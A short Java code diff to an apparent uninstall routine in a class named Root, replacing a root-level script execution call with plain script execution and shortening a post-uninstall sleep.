@@ -459,12 +459,9 @@ public class Root {
 				}
 			}
 			Core.serivceUnregister();
-			boolean ret = Execute.executeRootAndForgetScript(script);
-			if(!ret){
-				Execute.executeScript(script);
-			}
-
-			Utils.sleep(5000);
+			// removed executeRootAndForget call, todo: check any side effects when persistent
+			Execute.executeScript(script);
+			Utils.sleep(1000);
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (uninstallRoot): uninstalled"); //$NON-NLS-1$
